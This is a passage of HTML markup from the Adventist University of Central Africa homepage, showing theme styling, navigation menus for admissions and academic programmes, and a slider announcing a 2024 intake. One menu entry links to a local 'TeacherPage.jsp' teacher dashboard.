        <link rel="alternate" type="text/xml+oembed" href="https://auca.ac.rw/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fauca.ac.rw%2F&#038;format=xml"/>
        <style type="text/css" media="screen"></style>
        <!-- WPZOOM Theme / Framework -->
        <meta name="generator" content="Academica Pro 3.0 3.0.19"/>
        <meta name="generator" content="WPZOOM Framework 1.9.16"/>
        <!-- Begin Theme Custom CSS -->
        <style type="text/css" id="academica_pro_3-custom-css">
            .navbar-brand-wpz .tagline {
                display: none;
                font-family: "Montserrat";
            }

            body, h1, h2, h3, h4, h5, h6 {
                color: #000000;
            }

            .navbar-brand-wpz a {
                color: #00447b;
            }

            a {
                color: #00447b;
            }

            button, input[type=button], input[type=reset], input[type=submit] {
                background: #00447b;
            }

            #top-menu {
                background: #e3e6e8;
            }

            .top-navbar .navbar-wpz > li > a {
                color: #00447b;
                font-family: "Comfortaa";
                font-size: 16px;
            }

            .main-navbar {
                background: #00447b;
                border-top-color: #dd9933;
            }

            .navbar-wpz ul {
                background: #00447b;
            }

            .navbar-wpz ul li {
                border-color: #00447b;
            }

            .navbar-wpz > li > ul:after {
                border-bottom-color: #00447b;
            }

            .navbar-wpz > li > ul:before {
                border-bottom-color: #00447b;
            }

            .main-navbar .navbar-wpz > li > a:hover {
                color: #dd8b0f;
            }

            .slides .slide_button a {
                background: #00458b;
                font-family: "Montserrat";
                font-weight: normal;
            }

            .slides .slide_button a:hover {
                color: #0072bc;
            }

            .posts-archive h2 a, .posts-archive h2.entry-title a {
                color: #00447b;
            }

            .posts-archive h2 a:hover, .posts-archive h2.entry-title a:hover {
                color: #00447b;
            }

            .entry-meta a {
                color: #00447b;
            }

            .posts-archive .post-meta a {
                border-color: #00447b;
            }

            .posts-archive .post-meta a:hover {
                color: #00447b;
            }

            .widget .title {
                color: #00447b;
            }

            .site-footer {
                background-color: #00447b;
                border-color: #dd9933;
            }

            #footer-copy {
                background-color: #ddc573;
                color: #0a5600;
            }

            .site-footer a {
                color: #ef851a;
            }

            .site-footer a:hover {
                color: #000000;
            }

            body {
                font-family: "Montserrat";
            }

            .post-content {
                font-family: "Montserrat";
                font-size: 16px;
            }

            .navbar-brand-wpz h1 a {
                font-family: "Ubuntu";
                font-size: 32px;
                font-weight: normal;
            }

            .logo-navbar .navbar-wpz > li > a {
                font-family: "Comfortaa";
                font-size: 15px;
            }

            .main-navbar a {
                font-family: "Comfortaa";
                font-size: 18px;
            }

            .slides li h3, .page-template-home-full .slides li h3, .page-template-home-3cols .slides li h3 {
                font-family: "Zilla Slab Highlight";
                font-size: 24px;
                font-weight: normal;
            }

            .slides li .slide-header p {
                font-family: "Montserrat";
                font-size: 14px;
            }

            .widget h3.title {
                font-family: "Comfortaa";
                font-size: 20px;
                font-weight: normal;
                text-transform: uppercase;
            }

            .site-footer .widget .title {
                font-family: "Comfortaa";
                font-weight: normal;
            }

            .posts-archive h2, .posts-archive h2.entry-title {
                font-family: "Montserrat";
                font-weight: normal;
            }

            .single h1.post-title {
                font-family: "Comfortaa";
                font-size: 30px;
                font-weight: normal;
            }

            .page h1.post-title {
                font-family: "Montserrat";
                font-size: 30px;
                font-weight: normal;
            }

            .site-footer, .site-footer .column, #footer-copy {
                font-family: "Comfortaa";
                text-transform: none;
            }
        </style>
        <!-- End Theme Custom CSS -->
        <link rel="icon" href="https://auca.ac.rw/wp-content/uploads/2021/10/cropped-AUCA-Logooo-32x32.jpg" sizes="32x32"/>
        <link rel="icon" href="https://auca.ac.rw/wp-content/uploads/2021/10/cropped-AUCA-Logooo-192x192.jpg" sizes="192x192"/>
        <link rel="apple-touch-icon" href="https://auca.ac.rw/wp-content/uploads/2021/10/cropped-AUCA-Logooo-180x180.jpg"/>
        <meta name="msapplication-TileImage" content="https://auca.ac.rw/wp-content/uploads/2021/10/cropped-AUCA-Logooo-270x270.jpg"/>
    </head>
    <body class="home page-template page-template-page-templates page-template-home-full page-template-page-templateshome-full-php page page-id-6070 wp-custom-logo">
        <div id="container">
            <header id="header">
                <nav id="top-menu">
                    <div class="wrapper">
                        <div id="navbar-top" class="top-navbar">
                            <div class="menu-top-container">
                                <ul id="menu-top" class="navbar-wpz dropdown sf-menu">
                                    <li id="menu-item-7056" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-7056">
                                        <a href="https://auca.ac.rw/apply/">Apply</a>
                                        <ul class="sub-menu">
                                            <li id="menu-item-7218" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7218">
                                                <a href="https://auca.ac.rw/contact/">Online Application</a>
                                            </li>
                                        </ul>
                                    </li>
                                    <li id="menu-item-7337" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-7337">
                                        <a href="https://auca.ac.rw/online-registration/">Online Registration</a>
                                    </li>
                                    <li id="menu-item-7668" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-7668">
                                        <a href="https://auca.ac.rw/ebooks-and-open-access-database-2/">e-Library</a>
                                    </li>
                                    <li id="menu-item-8457" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-8457">
                                        <a target="_blank" rel="noopener" href="https://auca.ac.rw/newsletter/">Newsletter</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div class="header_social">
                            <div id="zoom-social-icons-widget-8" class="widget zoom-social-icons-widget widget-none">
                                <h3 class="title">
                                    <span>Follow us</span>
                                </h3>
                                <ul class="zoom-social-icons-list zoom-social-icons-list--with-canvas zoom-social-icons-list--rounded zoom-social-icons-list--no-labels">
                                    <li class="zoom-social_icons-list__item">
                                        <a class="zoom-social_icons-list__link" href="https://web.facebook.com/AUCAofficial/?ref=bookmarks&#038;_rdc=1&#038;_rdr" target="_blank" title="Facebook">
                                            <span class="screen-reader-text">facebook</span>
                                            <span class="zoom-social_icons-list-span social-icon socicon socicon-facebook" data-hover-rule="background-color" data-hover-color="#3b5998" style="background-color : #3b5998; font-size: 18px; padding:8px"></span>
                                        </a>
                                    </li>
                                    <li class="zoom-social_icons-list__item">
                                        <a class="zoom-social_icons-list__link" href="https://twitter.com/AUCA_Rwanda" target="_blank" title="Twitter">
                                            <span class="screen-reader-text">twitter</span>
                                            <span class="zoom-social_icons-list-span social-icon socicon socicon-twitter" data-hover-rule="background-color" data-hover-color="#1da1f2" style="background-color : #1da1f2; font-size: 18px; padding:8px"></span>
                                        </a>
                                    </li>
                                    <li class="zoom-social_icons-list__item">
                                        <a class="zoom-social_icons-list__link" href="https://www.instagram.com/aucarwanda/" target="_blank" title="Instagram">
                                            <span class="screen-reader-text">instagram</span>
                                            <span class="zoom-social_icons-list-span social-icon socicon socicon-instagram" data-hover-rule="background-color" data-hover-color="#e4405f" style="background-color : #e4405f; font-size: 18px; padding:8px"></span>
                                        </a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                        <div id="header-helpful">
                            <span class="action">
                                Apply Now for March,2024 Intake Academic year 2023-2024 Call<span class="value">+250 724796998</span>
                            </span>
                        </div>
                        <!-- end #header-helpful -->
                        <div class="clear"></div>
                    </div>
                </nav>
                <!-- end #top-menu -->
                <div class="cleaner"></div>
                <div class="wrapper">
                    <div class="brand_wrapper">
                        <div class="navbar-brand-wpz">
                            <a href="https://auca.ac.rw/" class="custom-logo-link" rel="home" itemprop="url">
                                <img width="502" height="116" src="https://auca.ac.rw/wp-content/uploads/2021/02/cropped-AUCA-logo-wide-webblue-2-1-1.png" class="custom-logo no-lazyload no-lazy a3-notlazy" alt="Adventist University of Central Africa" itemprop="logo" decoding="async" fetchpriority="high" srcset="https://auca.ac.rw/wp-content/uploads/2021/02/cropped-AUCA-logo-wide-webblue-2-1-1.png 502w, https://auca.ac.rw/wp-content/uploads/2021/02/cropped-AUCA-logo-wide-webblue-2-1-1-300x69.png 300w, https://auca.ac.rw/wp-content/uploads/2021/02/cropped-AUCA-logo-wide-webblue-2-1-1-238x55.png 238w" sizes="(max-width: 502px) 100vw, 502px"/>
                            </a>
                            <p class="tagline">AUCA</p>
                        </div>
                        <!-- .navbar-brand -->
                        <div id="navbar-logo" class="logo-navbar">
                            <div class="menu-middle-container">
                                <ul id="menu-middle" class="navbar-wpz dropdown sf-menu">
                                    <li id="menu-item-9087" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9087">
                                        <a href="https://auca.ac.rw/auca-29th-graduation/">29th Graduation</a>
                                    </li>
                                    <li id="menu-item-8920" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-8920">
                                        <a href="https://auca.ac.rw/online-application/">Online Application</a>
                                    </li>
                                    <li id="menu-item-8921" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8921">
                                        <a href="https://auca.ac.rw/online-registration/">Online Registration</a>
                                    </li>
                                </ul>
                            </div>
                        </div>
                    </div>
                    <div class="cleaner">&nbsp;</div>
                </div>
                
               
                <!-- end .wrapper -->
            </header>
            <nav id="main-navbar" class="main-navbar">
                <div class="wrapper">
                    <div class="navbar-header-main">
                        <div id="menu-main-slide" class="menu-unnamed-2-container">
                            <ul id="menu-unnamed-2" class="menu">
                                <li id="menu-item-9801" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-6070 current_page_item menu-item-9801">
                                    <a href="https://auca.ac.rw/" aria-current="page">Home</a>
                                </li>
                                
                                <li id="menu-item-9812" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9812">
                                    <a href="https://auca.ac.rw/about/">About</a>
                                    <ul class="sub-menu">
                                        <li id="menu-item-9833" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9833">
                                            <a href="https://auca.ac.rw/auca-background/">Background</a>
                                        </li>
                                        <li id="menu-item-9838" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9838">
                                            <a href="https://auca.ac.rw/mission-vision/">Vision &#038;Mission</a>
                                        </li>
                                        <li id="menu-item-9835" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9835">
                                            <a href="https://auca.ac.rw/beliefs-and-values/">Beliefs and Values</a>
                                        </li>
                                        <li id="menu-item-9817" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9817">
                                            <a href="https://auca.ac.rw/academics/auca-policies/">AUCA POLICIES</a>
                                        </li>
                                        <li id="menu-item-9878" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9878">
                                            <a href="https://auca.ac.rw/about/location/">Location</a>
                                        </li>
                                    </ul>
                                </li>
                                <li id="menu-item-9823" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9823">
                                    <a href="https://auca.ac.rw/admissions/">Admissions</a>
                                    <ul class="sub-menu">
                                        <li id="menu-item-9840" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9840">
                                            <a href="https://auca.ac.rw/undergraduate-admission-requirements/">Undergraduate Admission Requirements</a>
                                        </li>
                                        <li id="menu-item-9841" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9841">
                                            <a href="https://auca.ac.rw/auca-nursing-entry-requirements/">Nursing &#038;Midwifery Entry Requirements</a>
                                        </li>
                                        <li id="menu-item-9846" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9846">
                                            <a href="https://auca.ac.rw/admissions/graduate-requirements/">Masters Admission Requirements</a>
                                        </li>
                                        <li id="menu-item-9825" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9825">
                                            <a href="https://auca.ac.rw/application-forms/">Application Forms</a>
                                        </li>
                                        <li id="menu-item-9860" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9860">
                                            <a href="https://auca.ac.rw/fees-structure/">Fee Structure</a>
                                        </li>
                                    </ul>
                                </li>
                                <li id="menu-item-9816" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9816">
                                    <a href="https://auca.ac.rw/academics/">Academics</a>
                                    <ul class="sub-menu">
                                        <li id="menu-item-9815" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9815">
                                            <a href="https://auca.ac.rw/academic-calendar-2023-2024/">Academic Calendar 2023 – 2024</a>
                                        </li>
                                        <li id="menu-item-9869" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9869">
                                            <a href="https://auca.ac.rw/undergraduate-program/">Undergraduate Programmes</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9871" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9871">
                                                    <a href="https://auca.ac.rw/business-administration/">Faculty of Business Administration</a>
                                                    <ul class="sub-menu">
                                                        <li id="menu-item-9867" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9867">
                                                            <a href="https://auca.ac.rw/marketing-major/">Marketing Major</a>
                                                        </li>
                                                        <li id="menu-item-9866" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9866">
                                                            <a href="https://auca.ac.rw/management-major/">Management Major</a>
                                                        </li>
                                                        <li id="menu-item-9875" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9875">
                                                            <a href="https://auca.ac.rw/finance-major/">Finance Major</a>
                                                        </li>
                                                        <li id="menu-item-9970" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9970">
                                                            <a href="https://auca.ac.rw/?page_id=6911">Accounting Major</a>
                                                        </li>
                                                    </ul>
                                                </li>
                                                <li id="menu-item-9858" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9858">
                                                    <a href="https://auca.ac.rw/faculty-of-education/">Faculty of Education</a>
                                                    <ul class="sub-menu">
                                                        <li id="menu-item-9818" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9818">
                                                            <a href="https://auca.ac.rw/accounting-major-and-information-technology-minor/">Accounting (Major) and Information Technology (Minor)</a>
                                                        </li>
                                                        <li id="menu-item-9855" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9855">
                                                            <a href="https://auca.ac.rw/economics-major-and-mathematics-minor/">Economics (Major) and Mathematics (Minor)</a>
                                                        </li>
                                                        <li id="menu-item-9857" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9857">
                                                            <a href="https://auca.ac.rw/english-and-french-literature-major-minor/">English and French Literature Major/Minor</a>
                                                        </li>
                                                        <li id="menu-item-9856" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9856">
                                                            <a href="https://auca.ac.rw/educational-psychology-major-and-religion-minor/">Educational Psychology (Major) and Religion (Minor)</a>
                                                        </li>
                                                        <li id="menu-item-9861" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9861">
                                                            <a href="https://auca.ac.rw/history-major-and-geography-minor/">History (Major) and Geography (Minor)</a>
                                                        </li>
                                                    </ul>
                                                </li>
                                                <li id="menu-item-9851" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9851">
                                                    <a href="https://auca.ac.rw/faculty-of-theology/">Faculty of Theology</a>
                                                </li>
                                                <li id="menu-item-9870" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9870">
                                                    <a href="https://auca.ac.rw/faculty-of-information-technology/">Faculty of Information Technology</a>
                                                    <ul class="sub-menu">
                                                        <li id="menu-item-9853" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9853">
                                                            <a href="https://auca.ac.rw/network-and-communication-systems-major/">Network and Communication Systems Major</a>
                                                        </li>
                                                        <li id="menu-item-9862" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9862">
                                                            <a href="https://auca.ac.rw/information-management-major/">Information Management Major</a>
                                                        </li>
                                                        <li id="menu-item-9852" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9852">
                                                            <a href="https://auca.ac.rw/software-engineering-major/">Software Engineering Major</a>
                                                        </li>
                                                    </ul>
                                                </li>
                                            </ul>
                                        </li>
                                        <li id="menu-item-9873" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9873">
                                            <a href="https://auca.ac.rw/graduate-programmes/">Graduate Programmes</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9842" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9842">
                                                    <a href="https://auca.ac.rw/msc-in-big-data-analytics/">MSc in Big Data Analytics</a>
                                                </li>
                                                <li id="menu-item-9843" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9843">
                                                    <a href="https://auca.ac.rw/masters-of-business-administration-mba/">Masters of Business Administration (MBA).</a>
                                                </li>
                                                <li id="menu-item-9907" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9907">
                                                    <a href="https://auca.ac.rw/master-of-education/">Masters of Arts in Education</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li id="menu-item-9868" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9868">
                                            <a href="https://auca.ac.rw/school-of-medicine/">School of Medicine</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9880" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9880">
                                                    <a href="https://auca.ac.rw/nursing-midwifery/">Nursing &#038;Midwifery</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li id="menu-item-9877" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9877">
                                            <a href="https://auca.ac.rw/academic-bulletin-2/">Academic Bulletin</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9952" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9952">
                                                    <a href="https://auca.ac.rw/bba-bulletin/">Bulletin 2022-2025</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li id="menu-item-9872" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9872">
                                            <a href="https://auca.ac.rw/professional-courses/">Professional Courses</a>
                                        </li>
                                        <li id="menu-item-9839" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9839">
                                            <a href="https://auca.ac.rw/useful-documents/">Useful documents</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9854" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9854">
                                                    <a href="https://auca.ac.rw/useful-forms-and-auca-bulletin/">Useful Forms</a>
                                                </li>
                                            </ul>
                                        </li>
                                    </ul>
                                </li>
                                <li id="menu-item-9836" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9836">
                                    <a href="https://auca.ac.rw/media-center/">Media Center</a>
                                    <ul class="sub-menu">
                                        <li id="menu-item-9847" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9847">
                                            <a href="https://auca.ac.rw/service-charter/">Service Charter</a>
                                        </li>
                                        <li id="menu-item-9874" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9874">
                                            <a href="https://auca.ac.rw/news-updates/">News Updates</a>
                                        </li>
                                        <li id="menu-item-9803" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9803">
                                            <a href="https://auca.ac.rw/26th-graduation-2/">26th Graduation</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9805" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9805">
                                                    <a href="https://auca.ac.rw/26th-graduation-booklet/">26th Graduation Booklet</a>
                                                </li>
                                                <li id="menu-item-9806" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9806">
                                                    <a href="https://auca.ac.rw/26th-graduation-photos/">26th Graduation photos</a>
                                                </li>
                                                <li id="menu-item-9807" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9807">
                                                    <a href="https://auca.ac.rw/gallery-2/">26th Graduation Pictures</a>
                                                </li>
                                                <li id="menu-item-9808" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9808">
                                                    <a href="https://auca.ac.rw/26th-graduation-speeches-2/">26th Graduation Speeches</a>
                                                </li>
                                                <li id="menu-item-9804" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9804">
                                                    <a href="https://auca.ac.rw/26th-graduation-2/26th-graduation-videos/">26th Graduation Videos</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li id="menu-item-9809" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9809">
                                            <a href="https://auca.ac.rw/27th-graduation/">27th Graduation</a>
                                        </li>
                                        <li id="menu-item-9810" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9810">
                                            <a href="https://auca.ac.rw/28th-provisional-graduation-list/">28th Graduation List</a>
                                        </li>
                                        <li id="menu-item-9811" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9811">
                                            <a href="https://auca.ac.rw/auca-29th-graduation/">29th Graduation</a>
                                        </li>
                                    </ul>
                                </li>
                                <li id="menu-item-9837" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9837">
                                    <a href="https://auca.ac.rw/research/">Research</a>
                                    <ul class="sub-menu">
                                        <li id="menu-item-9829" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9829">
                                            <a href="https://auca.ac.rw/auca-journal/">AUCA Journal</a>
                                        </li>
                                        <li id="menu-item-9830" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9830">
                                            <a href="https://auca.ac.rw/auca-library/">AUCA Library</a>
                                            <ul class="sub-menu">
                                                <li id="menu-item-9863" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9863">
                                                    <a href="https://auca.ac.rw/library-dos-and-donts/">Library Dos and Don’ts</a>
                                                </li>
                                                <li id="menu-item-9864" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9864">
                                                    <a href="https://auca.ac.rw/library-faqs/">Library FAQs</a>
                                                </li>
                                                <li id="menu-item-9865" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9865">
                                                    <a href="https://auca.ac.rw/library-rules-and-regulations/">Library rules and regulations</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li id="menu-item-9848" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9848">
                                            <a href="https://auca.ac.rw/research-manual/">Research Manual</a>
                                        </li>
                                    </ul>
                                </li>
                                <li id="menu-item-9826" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9826">
                                    <a href="https://auca.ac.rw/apply/">Apply</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <div id="navbar-main">
                        <div class="menu-unnamed-2-container">
                            <ul id="menu-unnamed-3" class="navbar-wpz dropdown sf-menu">
                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-6070 current_page_item menu-item-9801">
                                    <a href="https://auca.ac.rw/" aria-current="page">Home</a>
                                </li>
                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9812">
                                    <a href="https://auca.ac.rw/about/">About</a>
                                    <ul class="sub-menu">
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9833">
                                            <a href="https://auca.ac.rw/auca-background/">Background</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9838">
                                            <a href="https://auca.ac.rw/mission-vision/">Vision &#038;Mission</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9835">
                                            <a href="https://auca.ac.rw/beliefs-and-values/">Beliefs and Values</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9817">
                                            <a href="https://auca.ac.rw/academics/auca-policies/">AUCA POLICIES</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9878">
                                            <a href="https://auca.ac.rw/about/location/">Location</a>
                                        </li>
                                    </ul>
                                </li>
                                
                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9836">
                                    <a href="https://auca.ac.rw/media-center/">Media Center</a>
                                    <ul class="sub-menu">
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9847">
                                            <a href="https://auca.ac.rw/service-charter/">Service Charter</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9874">
                                            <a href="https://auca.ac.rw/news-updates/">News Updates</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9803">
                                            <a href="https://auca.ac.rw/26th-graduation-2/">26th Graduation</a>
                                            <ul class="sub-menu">
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9805">
                                                    <a href="https://auca.ac.rw/26th-graduation-booklet/">26th Graduation Booklet</a>
                                                </li>
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9806">
                                                    <a href="https://auca.ac.rw/26th-graduation-photos/">26th Graduation photos</a>
                                                </li>
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9807">
                                                    <a href="https://auca.ac.rw/gallery-2/">26th Graduation Pictures</a>
                                                </li>
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9808">
                                                    <a href="https://auca.ac.rw/26th-graduation-speeches-2/">26th Graduation Speeches</a>
                                                </li>
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9804">
                                                    <a href="https://auca.ac.rw/26th-graduation-2/26th-graduation-videos/">26th Graduation Videos</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9809">
                                            <a href="https://auca.ac.rw/27th-graduation/">27th Graduation</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9810">
                                            <a href="https://auca.ac.rw/28th-provisional-graduation-list/">28th Graduation List</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9811">
                                            <a href="https://auca.ac.rw/auca-29th-graduation/">29th Graduation</a>
                                        </li>
                                    </ul>
                                </li>
                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9837">
                                    <a href="https://auca.ac.rw/research/">Research</a>
                                    <ul class="sub-menu">
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9829">
                                            <a href="https://auca.ac.rw/auca-journal/">AUCA Journal</a>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-9830">
                                            <a href="https://auca.ac.rw/auca-library/">AUCA Library</a>
                                            <ul class="sub-menu">
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9863">
                                                    <a href="https://auca.ac.rw/library-dos-and-donts/">Library Dos and Don’ts</a>
                                                </li>
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9864">
                                                    <a href="https://auca.ac.rw/library-faqs/">Library FAQs</a>
                                                </li>
                                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9865">
                                                    <a href="https://auca.ac.rw/library-rules-and-regulations/">Library rules and regulations</a>
                                                </li>
                                            </ul>
                                        </li>
                                        <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9848">
                                            <a href="https://auca.ac.rw/research-manual/">Research Manual</a>
                                        </li>
                                    </ul>
                                </li>
                                <li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-9826">
                                    <a href="TeacherPage.jsp">Teacher Dashboard</a>
                                </li>
                            </ul>
                        </div>
                    </div>
                    <!-- end .menu -->
                    <div id="sb-search" class="sb-search">
                        <form method="get" class="searchform" action="https://auca.ac.rw/">
                            <input type="search" class="sb-search-input" placeholder="Search&hellip;" value="" name="s" id="s"/>
                            <input type="submit" id="searchsubmit" class="sb-search-submit" value="Search"/>
                            <span class="sb-icon-search"></span>
                        </form>
                    </div>
                </div>
            </nav>
            <!-- end #main-menu -->
            <div id="main">
                <section id="slider" class="wpzoom_slider">
                    <ul class="slides clearfix">
                        <li class="slide">
                            <div class="slide-overlay">
                                <div class="slide-header">
                                    <h3>
                                        <a href="https://auca.ac.rw/march-2024-intake/">Admissions Open for June 2024 Intake</a>
                                    </h3>
                                    <div class="entry-meta">
                                        <span class="entry-date">
                                            <time class="entry-date" datetime="2024-03-13T11:20:53+02:00">March 13, 2024</time>
                                        </span>
                                    </div>
                                    <div class="slide_button">
                                        <a href="https://auca.ac.rw/march-2024-intake/" title="Permalink to Admissions Open for June 2024 Intake" rel="bookmark">Read More</a>
                                    </div>
                                </div>
                            </div>
                            <div class="slide-background" style="background-image:url('https://auca.ac.rw/wp-content/uploads/2024/03/june-intake.jpg')"></div>
                        </li>
                        <li class="slide">
                            <div class="slide-overlay">
                                <div class="slide-header">
                                    <h3>
                                        <a href="https://auca.ac.rw/masoro-campus/">Campuses</a>
                                    </h3>
                                    <div class="entry-meta">
                                        <span class="entry-date">
                                            <time class="entry-date" datetime="2021-05-10T18:15:00+02:00">May 10, 2021</time>
                                        </span>
                                    </div>
                                    <div class="slide_button">
                                        <a href="https://auca.ac.rw/masoro-campus/" title="Permalink to Campuses" rel="bookmark">Read More</a>
                                    </div>
                                </div>
                            </div>
                            <div class="slide-background" style="background-image:url('https://auca.ac.rw/wp-content/uploads/2022/05/Campuses.png')"></div>
                        </li>
                    </ul>
                </section>
                <div class="wrapper">
                    <section class="column-widgets">
                        <div class="widget-column">
                            <div class="widget wpzoom-media-widget widget-none" id="wpzoom-media-widget-2">
                                <div class="post_thumb_withbg" style="background-image:url('https://auca.ac.rw/wp-content/uploads/2020/04/Business-Services-Online-1-365x240.jpg')">
                                    <a href="https://sis.auca.ac.rw/" target="_blank">
                                        <div class="featured_page_content">
                                            <h3 class="title">Apply Online</h3>
                                        </div>
                                    </a>
                                </div>
                                <div class="clear"></div>
                            </div>
                        </div>
                        <!-- .column -->
                        <div class="widget-column">
                            <div class="widget wpzoom-media-widget widget-none" id="wpzoom-media-widget-3">
                                <div class="post_thumb_withbg" style="background-image:url('https://auca.ac.rw/wp-content/uploads/2020/01/Group-365x240.jpg')">
                                    <a href="https://auca.ac.rw/contact/" target="_blank">
                                        <div class="featured_page_content">
                                            <h3 class="title">Undergraduate</h3>
                                        </div>
                                    </a>
                                </div>
                                <div class="clear"></div>
                            </div>
                        </div>
                        <!-- .column -->
                        <div class="widget-column">
